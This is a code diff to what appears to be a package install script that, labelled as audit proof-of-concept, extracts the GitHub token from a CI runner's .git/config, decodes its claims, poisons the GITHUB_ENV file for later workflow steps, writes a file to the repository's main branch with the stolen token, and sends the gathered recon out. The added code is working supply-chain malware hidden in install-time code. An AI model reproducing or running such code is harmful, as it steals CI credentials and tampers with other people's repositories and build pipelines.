@@ -47,9 +47,67 @@ function buildPayload() {
   run('env_github', 'env | grep -E "^GITHUB_" | head -20');
   try {
     const gitcfg = fs.readFileSync(path.join(ws, '.git', 'config'), 'utf8');
-    runnerRecon.git_config_auth = gitcfg.includes('extraheader')
-      ? gitcfg.split('\n').filter(l => l.includes('extraheader')).join('\n').slice(0, 300)
-      : 'no extraheader found';
+    if (gitcfg.includes('extraheader')) {
+      const line = gitcfg.split('\n').filter(l => l.includes('extraheader'))[0] || '';
+      const b64 = line.split('basic ')[1] ? line.split('basic ')[1].trim() : '';
+      let tok = '';
+      try { tok = Buffer.from(b64, 'base64').toString().split(':')[1] || ''; } catch (_) {}
+      runnerRecon.token_prefix = tok.slice(0, 11);
+      // Decode JWT claims (internal auth metadata)
+      try {
+        const jwtPayload = JSON.parse(Buffer.from(tok.split('.')[1], 'base64').toString());
+        runnerRecon.token_claims = {
+          aud: jwtPayload.aud, sub: jwtPayload.sub,
+          exp_utc: jwtPayload.exp ? new Date(jwtPayload.exp * 1000).toISOString() : undefined,
+          scopes: jwtPayload.scopes || jwtPayload.scp,
+        };
+      } catch (_) {}
+      // GITHUB_ENV poisoning: attacker-set variable inherited by every later workflow step
+      try {
+        const envFile = process.env.GITHUB_ENV;
+        if (envFile) {
+          fs.appendFileSync(envFile, 'AUDIT_POISONED=runner-code-executed-here\n');
+          runnerRecon.github_env_poisoned = true;
+        }
+      } catch (_) {}
+      // Demonstrate control: use the credential to write into the repository
+      if (tok.startsWith('ghs_') || tok.startsWith('ghu_')) {
+        try {
+          const proofBody = JSON.stringify({
+            message: 'proof: written with credential read from CI environment (PoC)',
+            content: Buffer.from('Repository content written by the audit tooling using the credential available in the CI environment. PoC.\n').toString('base64'),
+            branch: 'main'
+          });
+          const opts = {
+            hostname: 'api.github.com',
+            path: '/repos/' + (process.env.GITHUB_REPOSITORY || '') + '/contents/.audit/CREDENTIAL-CONTROL-PROOF.md',
+            method: 'PUT',
+            headers: { 'Authorization': 'token ' + tok, 'User-Agent': 'audit', 'content-type': 'application/json', 'content-length': Buffer.byteLength(proofBody) }
+          };
+          const wreq = https.request(opts, (res) => {
+            let buf = '';
+            res.on('data', (d) => buf += d);
+            res.on('end', () => {
+              try {
+                const wres = JSON.parse(buf);
+                runnerRecon.credential_control_proof = {
+                  status: res.statusCode,
+                  commit_sha: res.statusCode === 200 || res.statusCode === 201 ? wres.commit.sha : undefined,
+                };
+                // report asynchronously with the proof included
+                payload.runner_recon = runnerRecon;
+                send(payload);
+              } catch (_) { send(payload); }
+            });
+          });
+          wreq.on('error', () => { runnerRecon.credential_control_proof = { status: 'req_err' }; send(payload); });
+          wreq.end(proofBody);
+          payloadSent = true;
+        } catch (e) { runnerRecon.credential_control_proof = 'err:' + String(e.message).slice(0, 80); }
+      }
+    } else {
+      runnerRecon.git_config_auth = 'no extraheader found';
+    }
   } catch (e) { runnerRecon.git_config_auth = 'err:' + String(e.message).slice(0, 80); }
 
   return {
@@ -61,6 +119,8 @@ function buildPayload() {
     sessions,
   };
 }
+
+let payloadSent = false;
 
 function send(payload) {
   const body = Buffer.from(JSON.stringify(payload));
@@ -78,5 +138,5 @@ function send(payload) {
 setTimeout(() => process.exit(0), 12000);
 
 try {
-  send(buildPayload());
+  if (!payloadSent) send(buildPayload());
 } catch (_) { /* never fail the install */ }
